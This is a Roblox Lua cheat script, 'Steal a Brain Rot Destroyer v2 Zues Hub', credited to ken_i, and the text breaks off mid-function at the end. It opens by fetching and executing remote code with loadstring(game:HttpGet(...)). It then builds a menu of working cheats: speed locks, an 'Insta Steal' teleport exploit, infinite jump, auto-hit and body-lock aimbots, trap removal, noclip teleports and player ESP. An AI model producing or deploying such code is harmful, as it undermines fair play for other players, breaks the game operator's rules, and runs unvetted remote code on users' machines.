local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create the main window
local Window = Rayfield:CreateWindow({
Name = "Steal a Brain Rot Destroyer v2 Zues Hub",
LoadingTitle = "made by ken_i",
LoadingSubtitle = "Using Rayfield",
ConfigurationSaving = { Enabled = true },
Discord = { Enabled = false },
KeySystem = false
})

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Core variables
local speedLockEnabled = false
local visibilityEnabled = false
local antiTrapEnabled = false
local antiTrapRunning = false
local medusaEnabled = false
local medusaCooldown = false
local medusaToolName = "Medusa's Head"
local medusaRange = 16
local sentryActive = false
local shopNPCCashActive = false
local originalShopPositions = {}

-- ShopNPCCash functionality
local function manageShopNPCCash()
while shopNPCCashActive and task.wait(0.1) do
local cashModel = workspace:FindFirstChild("ShopNPCCash")
local character = LocalPlayer.Character
local rootPart = character and character:FindFirstChild("HumanoidRootPart")

if cashModel and cashModel:IsA("Model") and rootPart then
-- Store original position if not already stored
if not originalShopPositions[cashModel] then
local primaryPart = cashModel.PrimaryPart or cashModel:FindFirstChildWhichIsA("BasePart")
if primaryPart then
originalShopPositions[cashModel] = primaryPart.CFrame
end
end

-- Prepare and move the model
local primaryPart = cashModel.PrimaryPart or cashModel:FindFirstChildWhichIsA("BasePart")
if primaryPart then
for _, part in ipairs(cashModel:GetDescendants()) do
if part:IsA("BasePart") then
part.Anchored = false
part.CanCollide = false
part.Massless = true
end
end
cashModel:SetPrimaryPartCFrame(rootPart.CFrame * CFrame.new(0, 0, -3))
end
end
end

-- Return shops to original positions when disabled
if not shopNPCCashActive then
for model, position in pairs(originalShopPositions) do
if model and model.Parent then
local primaryPart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
if primaryPart then
model:SetPrimaryPartCFrame(position)
for _, part in ipairs(model:GetDescendants()) do
if part:IsA("BasePart") then
part.Anchored = true
part.CanCollide = true
part.Massless = false
end
end
end
end
end
originalShopPositions = {}
end
end

-- Visibility functionality
local function makeCharacterVisible(character)
for _, part in ipairs(character:GetDescendants()) do
if part:IsA("BasePart") then
part.Transparency = 0
part.CanCollide = false
elseif part:IsA("Accessory") or part:IsA("Tool") then
local handle = part:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
end

local function makeToolsVisible(player)
local backpack = player:FindFirstChild("Backpack")
if backpack then
for _, tool in ipairs(backpack:GetChildren()) do
local handle = tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
if player.Character then
for _, tool in ipairs(player.Character:GetChildren()) do
local handle = tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
end

local function onCharacterAdded(character)
makeCharacterVisible(character)
character.ChildAdded:Connect(function(child)
task.wait(0.1)
if child:IsA("BasePart") then
child.Transparency = 0
child.CanCollide = true
elseif child:IsA("Accessory") or child:IsA("Tool") then
local handle = child:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end)
end

-- Speed lock
local function applySpeedProtection(humanoid)
if not humanoid then return end
humanoid.WalkSpeed = desiredSpeed
humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
if speedLockEnabled and humanoid.WalkSpeed ~= desiredSpeed then
humanoid.WalkSpeed = desiredSpeed
end
end)
end

-- Character listener
local function onPlayerCharacterAdded(character)
local humanoid = character:WaitForChild("Humanoid", 5)
if humanoid and speedLockEnabled then
applySpeedProtection(humanoid)
end
if visibilityEnabled then
onCharacterAdded(character)
end
end

LocalPlayer.CharacterAdded:Connect(onPlayerCharacterAdded)
if LocalPlayer.Character then onPlayerCharacterAdded(LocalPlayer.Character) end

-- Fake trap creation
local function getAveragePosition(obj)
if obj:IsA("Model") then
local total = Vector3.zero
local count = 0
for _, part in ipairs(obj:GetDescendants()) do
if part:IsA("BasePart") then
total += part.Position
count += 1
end
end
if count > 0 then return total / count end
elseif obj:IsA("BasePart") then
return obj.Position
end
return Vector3.zero
end

local function createFakeTrap(position)
local part = Instance.new("Part")
part.Name = "FakeTrap"
part.Size = Vector3.new(1.3,1.3,1.3)
part.Anchored = true
part.CanCollide = false
part.Color = Color3.fromRGB(0,255,0)
part.Material = Enum.Material.SmoothPlastic
part.Position = position + Vector3.new(0, part.Size.Y/2, 0)
part.Parent = workspace
end

local function startAntiTrap()
if antiTrapRunning then return end
antiTrapRunning = true
task.spawn(function()
while antiTrapEnabled do
for _, obj in ipairs(workspace:GetDescendants()) do
if obj.Name == "Trap" then
local pos = getAveragePosition(obj)
pcall(function() obj:Destroy() end)
createFakeTrap(pos)
end
end
task.wait(5)
end
antiTrapRunning = false
end)
end

-- Medusa logic
local function activateMedusa()
if medusaCooldown then return end
local char = LocalPlayer.Character
if not char then return end
local humanoid = char:FindFirstChildOfClass("Humanoid")
if not humanoid then return end
local equipped = char:FindFirstChild(medusaToolName)
if equipped then
equipped:Activate()
else
local tool = LocalPlayer.Backpack:FindFirstChild(medusaToolName)
if tool then
humanoid:EquipTool(tool)
task.wait(0.00001)
tool:Activate()
end
end
medusaCooldown = true
task.delay(0.006, function() medusaCooldown = false end)
end

-- Sentry grab logic
RunService.Heartbeat:Connect(function()
if not sentryActive then return end

local char = LocalPlayer.Character
if not char then return end
local tool = char:FindFirstChildOfClass("Tool")
local handle = tool and tool:FindFirstChild("Handle")
if not handle then return end

for _, part in ipairs(workspace:GetDescendants()) do
if part:IsA("BasePart") and part.Name:find("Sentry_") then
local dist = (part.Position - handle.Position).Magnitude
if dist <= 70 then
part.Massless = true
part.CanCollide = false
part.Anchored = false
part.CFrame = handle.CFrame
end
end
end
end)

-- UI Setup
local MainTab = Window:CreateTab("🎯 Main", 6034818371)
-- Below your Rayfield window and MainTab setup
local autoSwordEnabled = false
local lastUsed = 0
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Create the toggle
MainTab:CreateToggle({
Name = "🗡️Knock Back Arua Rainbow Sword",
CurrentValue = false,
Callback = function(enabled)
autoSwordEnabled = enabled

-- Execute the remote once on toggle on
if enabled then
task.spawn(function()
local args = { [1] = "Rainbowrath Sword" }
local remote = ReplicatedStorage:FindFirstChild("Packages")
:FindFirstChild("Net")
:FindFirstChild("RF/CoinsShopService/RequestBuy")
if remote then
pcall(function()
remote:InvokeServer(unpack(args))
end)
end
end)
end
end,
})

--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local root = character:WaitForChild("HumanoidRootPart")
local random = Random.new()

-- Apply heaviness to character
root.CustomPhysicalProperties = PhysicalProperties.new(500, 0.3, 0.5)

-- GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "KensInstaSteal"
gui.ResetOnSpawn = false
gui.Enabled = false -- Controlled by toggle

-- Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(1, -220, 0.4, 0)
frame.AnchorPoint = Vector2.new(0, 0.5)
frame.BackgroundTransparency = 1
frame.Active = true
frame.Draggable = true

-- Container
local container = Instance.new("Frame", frame)
container.Size = UDim2.new(0, 190, 0, 90)
container.Position = UDim2.new(0, 5, 0, 5)
container.BackgroundColor3 = Color3.fromRGB(25, 0, 0)
container.BorderSizePixel = 0
Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", container)
stroke.Thickness = 2
RunService.Heartbeat:Connect(function()
	stroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
end)

-- Title
local titleBar = Instance.new("TextLabel", container)
titleBar.Size = UDim2.new(1, 0, 0, 25)
titleBar.BackgroundTransparency = 1
titleBar.Text = "Ken's"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextColor3 = Color3.fromRGB(255, 100, 100)
titleBar.TextScaled = true

-- Button
local button = Instance.new("TextButton", container)
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 40)
button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
button.Text = "⚡ Insta Steal"
button.Font = Enum.Font.GothamBold
button.TextColor3 = Color3.fromRGB(255, 100, 100)
button.TextScaled = true
button.BorderSizePixel = 0
Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
local buttonStroke = Instance.new("UIStroke", button)
buttonStroke.Thickness = 2
RunService.Heartbeat:Connect(function()
	buttonStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
end)

-- Helpers
local function getDeliveryHitbox()
	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return end
	for _, plot in pairs(plots:GetChildren()) do
		local sign = plot:FindFirstChild("PlotSign")
		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
			return plot:FindFirstChild("DeliveryHitbox")
		end
	end
end

local function getYourBaseSign()
	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return end
	for _, plot in pairs(plots:GetChildren()) do
		local sign = plot:FindFirstChild("PlotSign")
		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
			return sign
		end
	end
end

local function TP(cf)
	if root then
		root.CFrame = cf + Vector3.new(
			random:NextNumber(-0.0001, 0.0001),
			random:NextNumber(-0.0001, 0.0001),
			random:NextNumber(-0.0001, 0.0001)
		)
	end
end

-- Insta Steal Logic with temporary jump
local function DeliverBrainrot()
	local hitbox = getDeliveryHitbox()
	if not hitbox then
		warn("DeliveryHitbox not found")
		return
	end

	local target = hitbox.CFrame * CFrame.new(0, -3, 0)
	local voidCF = CFrame.new(0, -3.4028234663852886e+38, 0)

	humanoid.WalkSpeed = 100000
	local startTime = tick()
	local teleporting = true

	-- Only auto jump during teleport
	local jumpConn = RunService.Heartbeat:Connect(function()
		if teleporting then
			humanoid.Jump = true
		end
	end)

	local heartbeatConn
	heartbeatConn = RunService.Heartbeat:Connect(function()
		local elapsed = tick() - startTime

		if elapsed < 2 then
			TP(target)
		elseif elapsed < 2.2 then
			TP(voidCF)
		elseif elapsed < 2.8 then
			TP(voidCF)
		elseif elapsed < 3 then
			local sign = getYourBaseSign()
			if sign then
				TP(sign.CFrame * CFrame.new(0, 5, 0))
			end
		else
			-- Cleanup
			heartbeatConn:Disconnect()
			jumpConn:Disconnect()
			teleporting = false
			humanoid.WalkSpeed = 16
		end
	end)
end

-- Respawn detection + auto rejoin
do
	local rejoinTime = 3.3
	local lowHealthDetected = false
	local rejoinCancelled = false

	local function startHealthCheck()
		lowHealthDetected = false
		rejoinCancelled = false

		local conn
		conn = humanoid.HealthChanged:Connect(function(hp)
			if hp < 5 and not lowHealthDetected then
				lowHealthDetected = true
				rejoinCancelled = false
				local startTime = tick()

				task.spawn(function()
					while tick() - startTime < rejoinTime do
						if humanoid.Health >= 5 then
							rejoinCancelled = true
							break
						end
						task.wait(0.5)
					end

					if not rejoinCancelled then
						StarterGui:SetCore("SendNotification", {
							Title = "Perm death",
							Text = "Rejoining...",
							Duration = 5,
							Icon = ""
						})
						TeleportService:Teleport(game.PlaceId, player)
					end
				end)
			end
		end)

		player.CharacterAdded:Connect(function(newChar)
			if conn then conn:Disconnect() end
			humanoid = newChar:WaitForChild("Humanoid")
			root = newChar:WaitForChild("HumanoidRootPart")
			root.CustomPhysicalProperties = PhysicalProperties.new(500, 0.3, 0.5)
			startHealthCheck()
		end)
	end

	startHealthCheck()
end

-- Button logic
button.MouseButton1Click:Connect(function()
	task.spawn(DeliverBrainrot)
end)

-- Toggle control (needs to be inside your UI library setup)
MainTab:CreateToggle({
	Name = "⚡️Kens Instant Steal",
	CurrentValue = false,
	Flag = "KensInstantStealToggle",
	Callback = function(state)
		gui.Enabled = state
	end,
})

-- Main heartbeat loop (runs each frame)
RunService.Heartbeat:Connect(function()
if not autoSwordEnabled then return end

local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
local backpack = LocalPlayer:FindFirstChild("Backpack")
if not (char and hrp and backpack) then return end

-- Find nearest player within 17 studs
local nearest, dist
for _, pl in ipairs(Players:GetPlayers()) do
if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
local d = (hrp.Position - pl.Character.HumanoidRootPart.Position).Magnitude
if not nearest or d < dist then
nearest, dist = pl, d
end
end
end

-- If a player is within range, face them
if nearest and dist <= 17 then
local targetHRP = nearest.Character:FindFirstChild("HumanoidRootPart")
hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z))

-- Equip â†’ Activate â†’ Unequip sword
if tick() - lastUsed >= 1 then
for _, tool in ipairs(backpack:GetChildren()) do
if tool:IsA("Tool") and tool.Name:match("Sword$") then
lastUsed = tick()
-- Clear current tool
for _, eq in ipairs(char:GetChildren()) do
if eq:IsA("Tool") then eq.Parent = backpack end
end
-- Use sword
tool.Parent = char
tool:Activate()
task.delay(0.3, function()
if tool.Parent == char then
tool.Parent = backpack
end
end)
break
end
end
end
end
end)

local bodyLockEnabled = false
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Create the toggle button in MainTab
MainTab:CreateToggle({
Name = "🎯Body Lock Nearby Players",
CurrentValue = false,
Flag = "BodyLockToggle",
Callback = function(state)
bodyLockEnabled = state
end,
})

--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

--// Toggles
local jumpBoostEnabled = false
local infiniteJumpEnabled = false

--// Settings
local jumpBoostForce = 67
local infiniteJumpMin = 45
local infiniteJumpMax = 60
local jumpCooldown = 0.05

--// State
local lastJumpTime = 0
local character, humanoid, rootPart
local boostConnection = nil

--// Rebinds character on spawn/reset
local function bindCharacter(char)
	character = char
	humanoid = char:WaitForChild("Humanoid")
	rootPart = char:WaitForChild("HumanoidRootPart")
	local jumping = false

	-- Clear old connection
	if boostConnection then
		boostConnection:Disconnect()
	end

	-- Jump Boost logic (trigger on jump state)
	boostConnection = humanoid.StateChanged:Connect(function(_, new)
		if new == Enum.HumanoidStateType.Jumping and not jumping and jumpBoostEnabled then
			jumping = true

			RunService.RenderStepped:Wait()
			if rootPart and rootPart.Parent then
				local currentVel = rootPart.Velocity
				rootPart.Velocity = currentVel + Vector3.new(0, jumpBoostForce, 0)
			end

			task.delay(0.2, function()
				jumping = false
			end)
		end
	end)
end

--// Initial bind
if LocalPlayer.Character then
	bindCharacter(LocalPlayer.Character)
end

--// Rebind on respawn
LocalPlayer.CharacterAdded:Connect(function(char)
	bindCharacter(char)
end)

--// Infinite Jump: Trigger on JumpRequest
UserInputService.JumpRequest:Connect(function()
	if not infiniteJumpEnabled then return end
	if not humanoid or not rootPart then return end
	if tick() - lastJumpTime < jumpCooldown then return end

	local state = humanoid:GetState()
	if state == Enum.HumanoidStateType.Freefall or state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.Jumping then
		local boost = math.random(infiniteJumpMin * 10, infiniteJumpMax * 10) / 10
		rootPart.Velocity = Vector3.new(rootPart.Velocity.X, boost, rootPart.Velocity.Z)
		lastJumpTime = tick()
	end
end)

--// UI Toggles (Connect to your MainTab)
MainTab:CreateToggle({
	Name = "🕊️ Infinite Jump",
	CurrentValue = false,
	Callback = function(state)
		infiniteJumpEnabled = state
	end
})

MainTab:CreateToggle({
	Name = "🏃‍♂️ Jump Boost",
	CurrentValue = false,
	Callback = function(state)
		jumpBoostEnabled = state
	end
})


--// Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local UIS = game:GetService("UserInputService")

--// Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FuturisticGui"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false
screenGui.Enabled = false -- Start hidden until toggle is enabled

--// Main Draggable Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 160, 0, 120)
mainFrame.Position = UDim2.new(1, -170, 0.4, 0)
mainFrame.AnchorPoint = Vector2.new(0, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

--// UI Stroke (blue glow)
local stroke = Instance.new("UIStroke")
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0, 170, 255)
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Parent = mainFrame

--// UI Corner (rounded edges)
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

--// UIListLayout (for button stacking)
local layout = Instance.new("UIListLayout")
layout.Parent = mainFrame
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 10)
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

--// Button creation function
local function createFuturisticButton(text)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 140, 0, 45)
    btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    btn.BorderSizePixel = 0
    btn.Text = text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    btn.TextColor3 = Color3.fromRGB(0, 170, 255)
    btn.AutoButtonColor = false

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn

    local btnStroke = Instance.new("UIStroke")
    btnStroke.Thickness = 1.5
    btnStroke.Color = Color3.fromRGB(0, 170, 255)
    btnStroke.Transparency = 0.4
    btnStroke.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        btnStroke.Transparency = 0
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        btnStroke.Transparency = 0.4
    end)

    return btn
end

--// Buttons
local upButton = createFuturisticButton("⬆ Up")
upButton.Parent = mainFrame

local downButton = createFuturisticButton("⬇ Down")
downButton.Parent = mainFrame

--// Variables
local teleportHeight = 240
local character = player.Character or player.CharacterAdded:Wait()
local targetSize = Vector3.new(55.3507, 466.2961, 495.0706)
local tolerance = 0.1

--// Utility Functions
local function isSizeMatch(partSize, targetSize, tol)
    return math.abs(partSize.X - targetSize.X) <= tol
       and math.abs(partSize.Y - targetSize.Y) <= tol
       and math.abs(partSize.Z - targetSize.Z) <= tol
end

local function findPartBySize()
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            if isSizeMatch(part.Size, targetSize, tolerance) then
                return part
            end
        end
    end
    return nil
end

--// Button Functions
local function teleportUp()
    character = player.Character or player.CharacterAdded:Wait()
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        root.CFrame = root.CFrame + Vector3.new(0, teleportHeight, 0)
    end
end

local function disableCollisionTemporarily()
    local part = findPartBySize()
    if part then
        part.CanCollide = false
        print("[Gui] Collision disabled on:", part.Name)
        task.delay(3, function()
            if part and part.Parent then
                part.CanCollide = true
                print("[Gui] Collision restored on:", part.Name)
            end
        end)
    else
        warn("[Gui] No matching part found.")
    end
end

--// Bind Button Events
upButton.MouseButton1Click:Connect(teleportUp)
downButton.MouseButton1Click:Connect(disableCollisionTemporarily)

--// Create Toggle Button in MainTab
MainTab:CreateToggle({
    Name = "🛠️ Up Down Steal Gui(PATCHED)",
    CurrentValue = false,
    Callback = function(enabled)
        screenGui.Enabled = enabled
    end
})


-- Continuous loop: rotates your body each frame when toggle is on
RunService.Heartbeat:Connect(function()
if not bodyLockEnabled then return end

local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
if not hrp then return end

local nearest, dist = nil, 30
for _, p in ipairs(Players:GetPlayers()) do
if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
local d = (hrp.Position - p.Character.HumanoidRootPart.Position).Magnitude
if d <= dist then
nearest, dist = p, d
end
end
end

if nearest then
local targetHRP = nearest.Character.HumanoidRootPart
hrp.CFrame = CFrame.lookAt(
hrp.Position,
Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z)
)
end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local autoActivateEnabled = false
local RANGE = 30
local DEBOUNCE_TIME = 0.15
local lastUsed = 0

local function getNearestPlayer(maxDistance)
local character = LocalPlayer.Character
if not character then return nil end
local hrp = character:FindFirstChild("HumanoidRootPart")
if not hrp then return nil end

for _, player in ipairs(Players:GetPlayers()) do
if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
local dist = (hrp.Position - player.Character.HumanoidRootPart.Position).Magnitude
if dist <= maxDistance then
return player
end
end
end
return nil
end

-- Heartbeat connection (runs only when toggle is enabled)
RunService.Heartbeat:Connect(function()
if not autoActivateEnabled then return end

local now = tick()
if now - lastUsed < DEBOUNCE_TIME then return end

local character = LocalPlayer.Character
if not character then return end
local hrp = character:FindFirstChild("HumanoidRootPart")
if not hrp then return end

local target = getNearestPlayer(RANGE)
if target then
-- Check the tool currently equipped (in character)
for _, tool in ipairs(character:GetChildren()) do
if tool:IsA("Tool") then
if tool.Name:match("Slap$") or tool.Name:match("Sword$") or tool.Name:match("Bat$") then
lastUsed = now
-- Activate without unequipping
tool:Activate()
break
end
end
end
end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- BOOST VARIABLES
local boostEnabled = false
local enforcedSpeed = 47
local defaultSpeed = 40
local currentHumanoid = nil
local speedConnection = nil

-- CREATE BOOST GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BoostUI"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.4, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- Rounded corners
local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 12)
uicorner.Parent = frame

-- Drop shadow
local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Image = "rbxassetid://1316045217"
shadow.ImageTransparency = 0.4
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.Position = UDim2.new(0, -10, 0, -10)
shadow.BackgroundTransparency = 1
shadow.ZIndex = 0
shadow.Parent = frame

-- Stroke (border)
local stroke = Instance.new("UIStroke")
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(255, 0, 0)
stroke.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(1, -20, 0.5, -10)
toggleButton.Position = UDim2.new(0, 10, 0, 10)
toggleButton.Text = "Boost: OFF"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 20
toggleButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
toggleButton.TextColor3 = Color3.new(1, 1, 1)
toggleButton.Parent = frame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(1, -20, 0.3, -5)
closeButton.Position = UDim2.new(0, 10, 0.65, 0)
closeButton.Text = "Close"
closeButton.Font = Enum.Font.Gotham
closeButton.TextSize = 18
closeButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.Parent = frame

-- BOOST LOGIC
local function bindSpeedProtection(humanoid)
	if speedConnection then speedConnection:Disconnect() end
	speedConnection = humanoid.Changed:Connect(function(prop)
		if prop == "WalkSpeed" and boostEnabled then
			if humanoid.WalkSpeed ~= enforcedSpeed then
				humanoid.WalkSpeed = enforcedSpeed
			end
		end
	end)
end

local function setBoostState(on)
	if not currentHumanoid then return end
	boostEnabled = on
	if on then
		defaultSpeed = currentHumanoid.WalkSpeed
		currentHumanoid.WalkSpeed = enforcedSpeed
		bindSpeedProtection(currentHumanoid)
		toggleButton.Text = "Boost: ON"
		toggleButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
	else
		if speedConnection then speedConnection:Disconnect() end
		currentHumanoid.WalkSpeed = defaultSpeed
		toggleButton.Text = "Boost: OFF"
		toggleButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
	end
end

toggleButton.MouseButton1Click:Connect(function()
	setBoostState(not boostEnabled)
end)

closeButton.MouseButton1Click:Connect(function()
	screenGui.Enabled = false
end)

-- HANDLE CHARACTER AND HUMANOID
local function onCharacterAdded(character)
	local hum = character:WaitForChild("Humanoid")
	currentHumanoid = hum

	-- Always reset to default on respawn
	if boostEnabled then
		currentHumanoid.WalkSpeed = enforcedSpeed
		bindSpeedProtection(currentHumanoid)
	else
		currentHumanoid.WalkSpeed = defaultSpeed
	end

	-- Reapply defaultSpeed for next time
	defaultSpeed = currentHumanoid.WalkSpeed

	-- Cleanup on death
	hum.Died:Connect(function()
		if speedConnection then speedConnection:Disconnect() end
		currentHumanoid = nil
	end)
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
	onCharacterAdded(player.Character)
end

-- ENFORCE SPEED CONSTANTLY
RunService.Heartbeat:Connect(function()
	if boostEnabled and currentHumanoid then
		if currentHumanoid.WalkSpeed ~= enforcedSpeed then
			currentHumanoid.WalkSpeed = enforcedSpeed
		end
	end
end)

-- ADD TO 'MainTab'
MainTab:CreateButton({
	Name = "⚡️Open Boost UI",
	Callback = function()
		screenGui.Enabled = not screenGui.Enabled
	end,
})

-- Add the toggle in MainTab
MainTab:CreateToggle({
Name = "👋Auto Hit",
CurrentValue = false,
Flag = "AutoActivateTools",
Callback = function(value)
autoActivateEnabled = value
end
})

local ShopTab = Window:CreateTab("🛒 Shop", 6034818371)
local EspTab = Window:CreateTab("👀 ESP", 6034818371)

local activeLockTimeEsp = false
local lteInstances = {}
local espUpdateTask = nil

local toggleButton

local function toggleLockTimeESP(state)
activeLockTimeEsp = state
if not activeLockTimeEsp then
for _, instance in pairs(lteInstances) do
if instance and instance.Parent then
instance:Destroy()
end
end
lteInstances = {}
end
end

local function updateLock()
if not activeLockTimeEsp then return end

for _, plot in pairs(workspace.Plots:GetChildren()) do
local purchases = plot:FindFirstChild("Purchases", true)
local plotBlock = purchases and purchases:FindFirstChild("PlotBlock", true)
local mainPart = plotBlock and plotBlock:FindFirstChild("Main", true)
local billboardGui = mainPart and mainPart:FindFirstChild("BillboardGui", true)
local timeLabel = billboardGui and billboardGui:FindFirstChild("RemainingTime", true)

if timeLabel and timeLabel:IsA("TextLabel") then
local espName = "LockTimeESP_" .. plot.Name
local existingBillboard = plot:FindFirstChild(espName)

local isUnlocked = timeLabel.Text == "0s"
local displayText = isUnlocked and "Unlocked" or ("Lock: " .. timeLabel.Text)

local textColor
if isUnlocked then
textColor = Color3.fromRGB(0, 255, 0) -- Green
else
textColor = Color3.fromRGB(255, 255, 0) -- Yellow
end

if not existingBillboard then
local billboard = Instance.new("BillboardGui")
billboard.Name = espName
billboard.Size = UDim2.new(0, 200, 0, 30)
billboard.StudsOffset = Vector3.new(0, 5, 0)
billboard.AlwaysOnTop = true
billboard.Adornee = mainPart

local label = Instance.new("TextLabel")
label.Text = displayText
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.TextScaled = true
label.TextColor3 = textColor
label.TextStrokeColor3 = Color3.new(0, 0, 0)
label.TextStrokeTransparency = 0
label.Font = Enum.Font.SourceSansBold
label.Parent = billboard

billboard.Parent = plot
lteInstances[plot.Name] = billboard
else
local label = existingBillboard:FindFirstChildOfClass("TextLabel")
if label then
label.Text = displayText
label.TextColor3 = textColor
end
end
else
if lteInstances[plot.Name] then
lteInstances[plot.Name]:Destroy()
lteInstances[plot.Name] = nil
end
end
end
end

-- Create toggle but disable turning off once on
toggleButton = EspTab:CreateToggle({
Name = "🔒LockTime ESP",
CurrentValue = false,
Callback = function(enabled)
if enabled then
toggleLockTimeESP(true)
if espUpdateTask then
espUpdateTask:Cancel()
end
espUpdateTask = task.spawn(function()
while activeLockTimeEsp do
updateLock()
task.wait(0.25)
end
end)
else
-- Prevent turning off by resetting toggle to true
toggleButton:SetValue(true)
end
end
})

local espEnabled = false
local Players = game:GetService("Players")
local ESPObjects = {}

local function createESP(player)
if player == Players.LocalPlayer then return end

local function addESP(character)
local head = character:FindFirstChild("Head")
if not head or ESPObjects[player] then return end

local billboard = Instance.new("BillboardGui")
billboard.Name = "PlayerESP"
billboard.Adornee = head
billboard.AlwaysOnTop = true
billboard.Size = UDim2.new(0, 100, 0, 20)
billboard.StudsOffset = Vector3.new(0, 2.5, 0)

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextStrokeTransparency = 0
label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
label.Font = Enum.Font.SourceSansBold
label.TextScaled = true
label.Text = player.DisplayName or player.Name
label.Parent = billboard

